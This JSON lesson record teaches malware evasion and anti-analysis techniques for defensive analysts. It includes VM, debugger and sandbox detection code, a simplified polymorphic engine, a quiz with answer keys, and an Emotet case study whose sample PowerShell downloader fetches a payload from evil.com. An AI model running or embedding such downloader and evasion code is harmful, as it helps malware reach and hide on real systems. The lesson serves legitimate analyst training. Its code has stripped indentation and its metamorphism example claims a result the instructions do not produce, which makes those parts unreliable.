{
  "lesson_id": "9a1288ba-d5ec-4bee-a51c-c44ca8b41c4f",
  "domain": "malware",
  "title": "Advanced Malware Evasion and Anti-Analysis Techniques",
  "difficulty": 3,
  "order_index": 10,
  "prerequisites": [
    "b9e4d3e2-0f8c-5g6b-9e4d-2b3c4d5e6f7a"
  ],
  "concepts": [
    "Sandbox detection and evasion",
    "Debugger detection techniques",
    "VM detection methods",
    "Anti-disassembly tricks",
    "Code obfuscation",
    "Polymorphic and metamorphic malware",
    "Timing-based evasion",
    "Environment checks",
    "String encryption",
    "Control flow obfuscation"
  ],
  "estimated_time": 55,
  "learning_objectives": [
    "Understand common sandbox and VM detection techniques",
    "Identify anti-debugging tricks in malware samples",
    "Analyze obfuscated and packed malware",
    "Defeat anti-analysis techniques during malware analysis",
    "Recognize polymorphic and metamorphic code patterns",
    "Apply advanced unpacking and deobfuscation methods"
  ],
  "post_assessment": [
    {
      "question": "What is the primary goal of malware using evasion techniques?",
      "options": [
        "To make the code run faster",
        "To avoid detection by security tools and hinder analysis",
        "To reduce file size",
        "To improve compatibility across systems"
      ],
      "correct_answer": 1,
      "question_id": "8363e36d-a9da-4d9d-9b51-9f3e66ebefcd",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "Which Windows API function is commonly checked by malware to detect debuggers?",
      "options": [
        "CreateFile",
        "IsDebuggerPresent",
        "GetSystemInfo",
        "malloc"
      ],
      "correct_answer": 1,
      "question_id": "c4940418-a825-40e6-8b60-a6d17c17099f",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is a common VM detection technique?",
      "options": [
        "Checking for VM-specific registry keys, MAC addresses, or hardware IDs",
        "Running antivirus scans",
        "Encrypting all strings",
        "Using multiple threads"
      ],
      "correct_answer": 0,
      "question_id": "ae4f6951-4557-4ef0-b5ef-75f24a98550c",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is polymorphic malware?",
      "options": [
        "Malware that changes its code structure with each infection while maintaining the same functionality",
        "Malware that only runs on multiple platforms",
        "Malware with multiple payloads",
        "Malware that spreads via email"
      ],
      "correct_answer": 0,
      "question_id": "9264249e-7cc3-492a-8365-efba8206d722",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is the difference between polymorphic and metamorphic malware?",
      "options": [
        "There is no difference",
        "Polymorphic uses encryption to change appearance; metamorphic rewrites its own code completely",
        "Polymorphic is more advanced",
        "Metamorphic only works on Windows"
      ],
      "correct_answer": 1,
      "question_id": "6a2f1e66-bbab-463a-841d-4ab70f48169d",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "Which technique detects analysis by measuring execution time?",
      "options": [
        "String encryption",
        "Code packing",
        "Timing attacks (RDTSC, sleep checks)",
        "API hashing"
      ],
      "correct_answer": 2,
      "question_id": "83c8b802-2452-4d5a-8d7a-d165c63fc5bf",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is API hashing used for in malware?",
      "options": [
        "Improving performance",
        "Hiding API calls by using hashed values instead of function names",
        "Creating digital signatures",
        "Encrypting network traffic"
      ],
      "correct_answer": 1,
      "question_id": "cd756f41-7017-41a2-8115-19247809af84",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "Which anti-disassembly technique involves inserting invalid opcodes?",
      "options": [
        "Code packing",
        "Junk byte insertion and opaque predicates",
        "String encryption",
        "Process hollowing"
      ],
      "correct_answer": 1,
      "question_id": "21f71091-8200-4759-93b2-61909de05938",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "How can analysts defeat IsDebuggerPresent checks?",
      "options": [
        "Use a different operating system",
        "Patch the function to always return False or use anti-anti-debug plugins",
        "Run malware on physical hardware only",
        "It cannot be defeated"
      ],
      "correct_answer": 1,
      "question_id": "beb3766e-a80e-48e1-b59b-119895d6d979",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is the purpose of string encryption in malware?",
      "options": [
        "To improve performance",
        "To hide suspicious strings (URLs, file paths, commands) from static analysis",
        "To compress the file",
        "To enable polymorphism"
      ],
      "correct_answer": 1,
      "question_id": "d67a8735-c04b-4b3d-ba31-9018e34e0b3d",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "minimum_effective_dose",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "text": "# Introduction to Malware Evasion Techniques\n\nModern malware is engaged in an arms race with security tools. As detection methods improve, malware developers create increasingly sophisticated evasion techniques. This lesson covers the advanced anti-analysis tricks that make malware analysis challenging—and how to defeat them.\n\n## Why Evasion Matters\n\nMalware uses evasion techniques to:\n- **Avoid detection**: Bypass antivirus, EDR, and sandboxes\n- **Hinder analysis**: Make reverse engineering difficult and time-consuming\n- **Maintain persistence**: Operate undetected for longer periods\n- **Increase success rate**: Higher infection rates when detection is delayed\n\n## Categories of Evasion\n\n**1. Environment Detection**\n- Sandbox detection\n- Virtual machine detection\n- Debugger detection\n- Analysis tool detection\n\n**2. Code Obfuscation**\n- Packing and encryption\n- Anti-disassembly tricks\n- Control flow obfuscation\n- String encryption\n\n**3. Behavioral Evasion**\n- Timing-based evasion\n- User interaction checks\n- Geographic targeting\n- Sleep/delay tactics\n\n**4. Advanced Techniques**\n- Polymorphism (code mutation)\n- Metamorphism (self-rewriting)\n- Fileless malware\n- Living-off-the-land binaries (LOLBins)\n\nLet's dive deep into each category and learn how to defeat these techniques."
      }
    },
    {
      "type": "video",
      "content": {
        "title": "Video: Advanced Malware Evasion and Anti-Analysis Techniques Overview",
        "url": "https://www.youtube.com/embed/AQDCe585Lnc",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "**Mindset Moment: The Cat-and-Mouse Game**\n\nEvasion techniques can be intimidating. You're facing malware written by skilled adversaries with time and resources. But here's the reality:\n\n**Every Evasion Technique Is a Clue**\n\nWhen malware tries to detect your analysis environment, it's actually revealing its intentions. Heavy obfuscation? The malware author is afraid of analysis. That means there's something valuable to find.\n\n**You Have Advantages:**\n1. **Patience**: You can spend hours on one sample. Malware must decide quickly.\n2. **Tools**: Debuggers, disassemblers, memory analysis—you control the environment.\n3. **Community**: Share knowledge with other analysts. Attackers work in silos.\n4. **Learning**: Every evasion technique you defeat makes you stronger.\n\n**Strategy**: Don't get frustrated when malware detects your VM or debugger. That's expected! Learn to patch checks, modify your environment, or use stealthier tools.\n\n**Remember**: The malware developer spent time on evasion. You have unlimited time for analysis. You win the patience game."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Sandbox and VM Detection\n\nMalware often checks if it's running in an analysis environment (sandbox or VM) and behaves benignly if detected.\n\n## Common VM Detection Techniques\n\n### 1. Registry Key Checks\n\nVMs have telltale registry keys:\n\n```python\nimport winreg\n\ndef detect_vm_via_registry():\nvm_indicators = [\n(winreg.HKEY_LOCAL_MACHINE, r\"SYSTEM\\\\ControlSet001\\\\Services\\\\VBoxGuest\"),  # VirtualBox\n(winreg.HKEY_LOCAL_MACHINE, r\"SOFTWARE\\\\VMware, Inc.\\\\VMware Tools\"),        # VMware\n(winreg.HKEY_LOCAL_MACHINE, r\"SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions\"), # VirtualBox\n]\n\nfor hkey, path in vm_indicators:\ntry:\nwinreg.OpenKey(hkey, path)\nreturn True  # VM detected!\nexcept FileNotFoundError:\ncontinue\n\nreturn False\n```bash\n\n### 2. Hardware Checks\n\n```c\n// Check for VM-specific hardware\n# include <windows.h>\n# include <stdio.h>\n\nBOOL detect_vm_hardware() {\n// Check CPU count (many sandboxes use 1-2 CPUs)\nSYSTEM_INFO si;\nGetSystemInfo(&si);\nif (si.dwNumberOfProcessors < 2) {\nreturn TRUE;  // Suspicious\n}\n\n// Check RAM (sandboxes often have < 4GB)\nMEMORYSTATUSEX ms;\nms.dwLength = sizeof(ms);\nGlobalMemoryStatusEx(&ms);\nif (ms.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) {  // < 4GB\nreturn TRUE;\n}\n\n// Check for VM-specific MAC addresses\n// VMware: 00:05:69, 00:0C:29, 00:1C:14, 00:50:56\n// VirtualBox: 08:00:27\n// Hyper-V: 00:15:5D\n\nreturn FALSE;\n}\n```bash\n\n### 3. Process and Driver Checks\n\n```powershell\n# Check for VM-related processes\n$vm_processes = @(\n\"vboxservice.exe\",    # VirtualBox\n\"vboxtray.exe\",\n\"vmtoolsd.exe\",       # VMware\n\"vmwaretray.exe\",\n\"vmwareuser.exe\"\n)\n\nforeach ($proc in $vm_processes) {\nif (Get-Process -Name $proc -ErrorAction SilentlyContinue) {\nWrite-Host \"VM detected: $proc\"\nexit\n}\n}\n\n# Check for VM drivers\n$vm_drivers = @(\"vboxguest\", \"vmmouse\", \"vmhgfs\", \"vmci\")\nforeach ($drv in $vm_drivers) {\nif (Get-WmiObject Win32_SystemDriver | Where-Object {$_.Name -eq $drv}) {\nWrite-Host \"VM driver detected: $drv\"\nexit\n}\n}\n```bash\n\n### 4. Timing-Based Detection\n\n```c\n// VMs run slower than physical hardware\n# include <windows.h>\n# include <intrin.h>\n\nBOOL detect_vm_timing() {\nunsigned __int64 start, end;\n\n// Measure RDTSC (Read Time-Stamp Counter)\nstart = __rdtsc();\nSleep(1000);  // Sleep 1 second\nend = __rdtsc();\n\n// On physical hardware: ~1-4 billion cycles per second\n// On VM with debugger: can be much more due to single-stepping\nunsigned __int64 elapsed = end - start;\n\nif (elapsed > 5000000000ULL) {  // > 5 billion cycles for 1 second?\nreturn TRUE;  // Likely debugged VM\n}\n\nreturn FALSE;\n}\n```bash\n\n## Defeating VM Detection\n\n### Method 1: Paravirtual Detection Patching\n\n```bash\n# Remove VM indicators before analysis\n\n# 1. Change registry keys\nreg delete \"HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\VBoxGuest\" /f\nreg delete \"HKLM\\\\SOFTWARE\\\\VMware, Inc.\" /f\n\n# 2. Rename VM processes (before starting analysis VM)\nren \"C:\\\\Program Files\\\\VMware\\\\VMware Tools\\\\vmtoolsd.exe\" vmtoolsd.bak\n\n# 3. Spoof hardware IDs (requires VM config changes)\n# Edit .vmx file (VMware):\nethernet0.addressType = \"static\"\nethernet0.address = \"00:11:22:33:44:55\"  # Non-VM MAC\n\n# 4. Increase VM resources\n# Set CPUs to 4+\n# Set RAM to 8GB+\n```bash\n\n### Method 2: Patching the Malware\n\nIf malware detects VM and exits:\n\n```python\n# Using a debugger or binary patcher\n# Find the VM detection check:\n#   test eax, eax\n#   jnz exit_program  ← Jumps if VM detected\n\n# Patch:\n# Change JNZ (75) to JZ (74) - invert the logic\n# Or NOP out the jump (90 90)\n\nwith open('malware.exe', 'r+b') as f:\nf.seek(0x1234)  # Offset of JNZ instruction\nf.write(b'\\x90\\x90')  # NOP out the jump\n```bash\n\n### Method 3: Bare Metal Analysis\n\nFor extremely evasive malware:\n- Use a dedicated physical machine for analysis\n- Install monitoring tools (Process Monitor, API Monitor)\n- Take full disk image before infection\n- Restore after analysis"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: Debugger Detection and Bypass\n\n## Common Debugger Detection Techniques\n\n### 1. IsDebuggerPresent API\n\n```c\n# include <windows.h>\n# include <stdio.h>\n\nint main() {\nif (IsDebuggerPresent()) {\nprintf(\"Debugger detected! Exiting...\\\\n\");\nreturn 1;\n}\n\nprintf(\"No debugger detected. Running payload...\\\\n\");\n// Malicious code here\nreturn 0;\n}\n```\n\n**Bypass Method 1: Patch in Debugger**\n\n```bash\n# In x64dbg or OllyDbg:\n# 1. Set breakpoint on IsDebuggerPresent\n# 2. When hit, change return value (EAX/RAX) to 0\n# 3. Continue execution\n\n# Or use ScyllaHide plugin (automatic anti-debug bypass)\n```\n\n**Bypass Method 2: Patch Binary**\n\n```python\nimport pefile\n\npe = pefile.PE('malware.exe')\n\n# Find IsDebuggerPresent in import table\nfor entry in pe.DIRECTORY_ENTRY_IMPORT:\nfor imp in entry.imports:\nif imp.name == b'IsDebuggerPresent':\n# Replace with always-returns-false function\n# Or NOP out the call instruction\npass\n```bash\n\n### 2. PEB (Process Environment Block) Check\n\nMore sophisticated:\n\n```asm\n; Check PEB->BeingDebugged flag directly\nmov eax, fs:[30h]      ; Get PEB address (32-bit)\nmov al, [eax+2]        ; PEB.BeingDebugged offset\ntest al, al\njnz debugger_detected   ; Jump if debugged\n```\n\n```c\n// C version\n# include <windows.h>\n\ntypedef struct _PEB {\nBYTE Reserved1[2];\nBYTE BeingDebugged;  // Offset 0x02\n// ... more fields\n} PEB, *PPEB;\n\nBOOL check_peb() {\nPPEB peb;\n\n# ifdef _WIN64\npeb = (PPEB)__readgsqword(0x60);  // 64-bit: GS:[0x60]\n# else\npeb = (PPEB)__readfsdword(0x30);  // 32-bit: FS:[0x30]\n# endif\n\nreturn peb->BeingDebugged;\n}\n```\n\n**Bypass: Modify PEB**\n\n```python\n# In WinDbg:\neb @$peb+2 0    # Set BeingDebugged to 0\n\n# Or use ScyllaHide/HideDebugger plugins\n```bash\n\n### 3. Timing Checks\n\n```c\n# include <windows.h>\n# include <intrin.h>\n\nBOOL detect_debugger_timing() {\nDWORD start, end;\n\nstart = GetTickCount();\n\n// Some benign operation\nint x = 0;\nfor (int i = 0; i < 1000; i++) {\nx += i;\n}\n\nend = GetTickCount();\n\n// Should take < 1ms normally\n// Under debugger (single-stepping): much longer\nif (end - start > 100) {\nreturn TRUE;  // Debugger detected\n}\n\nreturn FALSE;\n}\n```\n\n**Bypass: Don't Single-Step**\n\n```bash\n# Instead of single-stepping through timing checks:\n# 1. Set breakpoint after timing code\n# 2. Run (F9) instead of step (F7/F8)\n# 3. Or patch the timing threshold\n```bash\n\n### 4. Hardware Breakpoint Detection\n\n```c\n# include <windows.h>\n\nBOOL detect_hardware_breakpoints() {\nCONTEXT ctx;\nctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n\nGetThreadContext(GetCurrentThread(), &ctx);\n\n// Check debug registers DR0-DR3\nif (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {\nreturn TRUE;  // Hardware breakpoints detected\n}\n\nreturn FALSE;\n}\n```\n\n**Bypass: Clear Debug Registers**\n\n```python\n# In debugger, clear DR registers:\ndr0 = 0\ndr1 = 0\ndr2 = 0\ndr3 = 0\ndr6 = 0\ndr7 = 0\n```bash\n\n## Complete Anti-Debug Bypass Workflow\n\n```bash\n# 1. Use anti-anti-debug tools\n# Download ScyllaHide: https://github.com/x64dbg/ScyllaHide\n# Install as plugin in x64dbg/OllyDbg\n\n# 2. Configure ScyllaHide\n# Enable all protections:\n# [x] NtSetInformationThread\n# [x] NtQueryInformationProcess\n# [x] OutputDebugString\n# [x] PEB.BeingDebugged\n# [x] PEB.NtGlobalFlag\n# [x] Heap Flags\n# [x] Timing protections\n\n# 3. Alternative: Patch all checks\n# Create a script to automatically patch common checks\n\n# 4. Last resort: Emulation\n# Use Qiling or Unicorn to emulate execution\n# Full control over environment\n```bash\n\n## Practical Exercise\n\nDownload a crackme or malware sample with anti-debug:\n\n```bash\n# Example: al-khaser (anti-analysis toolkit)\n# https://github.com/LordNoteworthy/al-khaser\n\ngit clone https://github.com/LordNoteworthy/al-khaser.git\ncd al-khaser\n# Build with Visual Studio\n\n# Your task:\n# 1. Run al-khaser.exe\n# 2. It will detect debugger, VM, sandbox\n# 3. Using techniques learned, bypass all detections\n# 4. Make it report \"No threats detected\"\n```"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Code Obfuscation Techniques\n\n## 1. String Encryption\n\nMalware encrypts strings to hide them from static analysis:\n\n```c\n// Instead of:\nchar c2_server[] = \"http://evil.com/c2\";\n\n// Malware uses:\nunsigned char encrypted_c2[] = {0x3f, 0x21, 0x56, ...};\nunsigned char key[] = \"secret_key\";\n\n// Decrypt at runtime\nvoid xor_decrypt(unsigned char *data, size_t len, unsigned char *key, size_t keylen) {\nfor (size_t i = 0; i < len; i++) {\ndata[i] ^= key[i % keylen];\n}\n}\n\nxor_decrypt(encrypted_c2, sizeof(encrypted_c2), key, sizeof(key));\nprintf(\"C2 Server: %s\\\\n\", encrypted_c2);\n```\n\n**Analysis Technique:**\n\n```python\n# Find XOR decryption loops in IDA/Ghidra\n# Look for patterns:\n# - Loop over buffer\n# - XOR operation\n# - Key material nearby\n\n# Set breakpoint after decryption\n# Dump decrypted strings from memory\n```bash\n\n## 2. API Hashing\n\nHide API calls by using hashed values:\n\n```c\n// Instead of:\n// LoadLibrary(\"kernel32.dll\");\n// GetProcAddress(hKernel32, \"CreateFileA\");\n\n// Malware uses:\nDWORD hash_CreateFileA = 0x4FDAF6DA;  // Hash of \"CreateFileA\"\n\ntypedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, ...);\n\npCreateFileA MyCreateFileA = (pCreateFileA)GetProcAddressByHash(hash_CreateFileA);\nHANDLE hFile = MyCreateFileA(\"file.txt\", GENERIC_WRITE, ...);\n```\n\n**Analysis: Reconstruct Hash Table**\n\n```python\nimport pefile\nimport hashlib\n\ndef calculate_api_hash(api_name, algorithm='ror13'):\n\"\"\"Calculate API hash using common algorithm\"\"\"\nhash_val = 0\nfor char in api_name:\n# ROR13 hash (common in malware)\nhash_val = ((hash_val >> 13) | (hash_val << (32 - 13))) & 0xFFFFFFFF\nhash_val += ord(char)\nhash_val &= 0xFFFFFFFF\nreturn hash_val\n\n# Build hash table for all Windows APIs\npe = pefile.PE('C:\\\\Windows\\\\System32\\\\kernel32.dll')\nfor exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:\nif exp.name:\napi_hash = calculate_api_hash(exp.name.decode())\nprint(f\"{exp.name.decode()}: 0x{api_hash:08X}\")\n```bash\n\n## 3. Control Flow Obfuscation\n\n**Opaque Predicates**: Conditions that always evaluate the same way but are hard to analyze:\n\n```c\n// Always true, but hard for static analysis to determine\nint x = some_calculation();\nint y = another_calculation();\n\nif ((x * x + y * y) >= 0) {  // Always true (squares are non-negative)\n// Real code\n} else {\n// Dead code (never executes)\nprintf(\"Fake payload\");  // Misleads analyst\n}\n```\n\n**Junk Code Insertion**:\n\n```asm\n; Real instruction\nmov eax, [ebp+8]\n\n; Junk instructions (do nothing useful)\npush ebx\npop ebx\nxor ecx, ecx\nadd ecx, 0\n\n; Real instruction\nadd eax, 5\n\n; More junk\njmp $+5     ; Jump over nothing\nnop\n```bash\n\n## 4. Polymorphism\n\nCode changes with each infection:\n\n```python\n# Polymorphic engine (simplified)\nimport random\n\ndef generate_nop_equivalent():\n\"\"\"Generate functionally equivalent NOP instructions\"\"\"\nnops = [\nb'\\x90',              # nop\nb'\\x87\\xC0',          # xchg eax, eax\nb'\\x40\\x48',          # inc eax; dec eax\nb'\\x50\\x58',          # push eax; pop eax\n]\nreturn random.choice(nops)\n\ndef polymorphic_encrypt(payload, key):\n\"\"\"Encrypt payload with random key\"\"\"\nencrypted = bytearray()\nfor byte in payload:\nencrypted.append(byte ^ key)\nreturn encrypted, key\n\ndef generate_decryptor(key):\n\"\"\"Generate decryptor stub with random instructions\"\"\"\ndecryptor = b''\n\n# Add random NOPs\nfor _ in range(random.randint(5, 20)):\ndecryptor += generate_nop_equivalent()\n\n# Decryption loop (changes each time)\ndecryptor += b'\\x31\\xC0'  # xor eax, eax (counter)\n# ... (actual decryption code with variations)\n\nreturn decryptor\n\n# Each infection has different decryptor\npayload = b'malicious_code_here'\nkey = random.randint(0, 255)\nencrypted, key = polymorphic_encrypt(payload, key)\ndecryptor = generate_decryptor(key)\n\nfinal_malware = decryptor + encrypted\n# Signature-based AV can't detect (different hash each time)\n```bash\n\n## 5. Metamorphism\n\nCode rewrites itself completely:\n\n```\nOriginal:          Generation 1:       Generation 2:\nmov eax, 5    →   mov eax, 3     →   mov ebx, 1\nadd eax, 3         add eax, 2          mov eax, 4\nmul eax, 2         mul eax, 2          add eax, ebx\nadd eax, 4          mul eax, 2\nsub eax, 2\n\nAll functionally equivalent (EAX = 16), but completely different code\n```"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Case Study: Emotet's Evasion Techniques\n\n## Background\n\nEmotet (2014-2021) was one of the most dangerous malware families, using sophisticated evasion to avoid detection. At its peak, Emotet infected millions of systems and served as a delivery mechanism for other malware (TrickBot, Ryuk ransomware).\n\n## Evasion Techniques Used\n\n### 1. Multi-Stage Delivery\n\n```\nPhishing Email\n→ Office Document with Macro\n→ PowerShell Downloader (obfuscated)\n→ Emotet DLL (encrypted)\n→ Additional Payloads\n```\n\nEach stage uses different evasion techniques, making detection harder.\n\n### 2. PowerShell Obfuscation\n\nEmotet's PowerShell downloader was heavily obfuscated:\n\n```powershell\n# Original (simple):\nInvoke-WebRequest -Uri \"http://evil.com/payload.dll\" -OutFile \"C:\\\\temp\\\\payload.dll\"\n\n# Emotet version (obfuscated):\n$wC = NEW-OBjeCT sYStEM.neT.WEBCLIeNt\n$wc.\"D`o`W`Nl`oa`DFI`le\"(\"h\"+\"ttp\"+\":\"+'/'+'/'+'e'+'v'+'i'+'l'+\".c\"+\"om/\"+\"pay\"+\"load.\"+\"dll\",\"C:\"+\"\\\"+\"\\\"+\"temp\"+\"\\\"+\"\\\"+\"pay\"+\"load.\"+\"dll\")\n```bash\n\n### 3. Dynamic API Resolution\n\nEmotet resolved APIs at runtime to avoid static analysis:\n\n```c\n// Load function dynamically\nHMODULE hKernel32 = GetModuleHandleA(\"kernel32.dll\");\ntypedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);\npVirtualAlloc MyVirtualAlloc = (pVirtualAlloc)GetProcAddress(hKernel32, \"VirtualAlloc\");\n\n// Use function\nLPVOID mem = MyVirtualAlloc(NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n```bash\n\n### 4. Sandbox Evasion\n\nEmotet checked for analysis environments:\n\n```c\n// Check if running in sandbox (limited execution time)\nSleep(300000);  // Sleep 5 minutes\n\n// Check mouse movement (sandboxes often don't simulate user interaction)\nPOINT p1, p2;\nGetCursorPos(&p1);\nSleep(5000);\nGetCursorPos(&p2);\nif (p1.x == p2.x && p1.y == p2.y) {\nexit(0);  // No mouse movement = sandbox\n}\n\n// Check system uptime (sandboxes often freshly booted)\nDWORD uptime = GetTickCount();\nif (uptime < 600000) {  // < 10 minutes\nexit(0);  // Likely sandbox\n}\n```bash\n\n### 5. Process Injection\n\nEmotet injected into legitimate processes:\n\n```\n1. Target: svchost.exe, explorer.exe (legitimate Windows processes)\n2. Technique: Process Hollowing or APC injection\n3. Result: Emotet code runs under trusted process name\n```bash\n\n## Takedown (January 2021)\n\nInternational law enforcement operation:\n- Seized infrastructure across 8 countries\n- Arrested 2 operators in Ukraine\n- Developed cleanup tool\n- Estimated disruption: $2.5B in damages prevented\n\n## Lessons for Analysts\n\n1. **Multi-layer analysis**: Don't stop at first stage\n2. **Dynamic analysis essential**: Obfuscation defeats static analysis\n3. **Patience**: Emotet delayed execution to evade sandboxes\n4. **Tool diversity**: No single tool catches everything\n5. **Community sharing**: Emotet was defeated through global cooperation"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection and Practice\n\n## Key Takeaways\n\n1. **Evasion is a red flag**: Heavy obfuscation means the malware is hiding something valuable\n2. **No silver bullet**: Combine static, dynamic, and manual analysis\n3. **Environment matters**: Use hardened analysis VMs with anti-detection measures\n4. **Patience pays**: Don't let evasion frustrate you—it's solvable\n\n## Challenge Exercises\n\n1. **Download al-khaser** (https://github.com/LordNoteworthy/al-khaser) and bypass all 80+ detection techniques\n\n2. **Create your own evasion detector**: Write a tool that identifies common evasion techniques in malware samples\n\n3. **Analyze a polymorphic sample**: Find samples of Emotet or Dridex and track code changes across variants\n\n4. **Build a deobfuscator**: Write a PowerShell or JavaScript deobfuscator for common obfuscation patterns\n\n## Recommended Resources\n\n- **Book**: \"Practical Malware Analysis\" - Sikorski & Honig\n- **Course**: Malware Analysis Bootcamp by OpenSecurityTraining\n- **Tool**: Ghidra's decompiler with deobfuscation scripts\n- **Community**: MalwareTech blog, Malware Analysis subreddit\n\nMaster these evasion techniques and you'll be ready for any malware challenge!"
      }
    }
  ]
}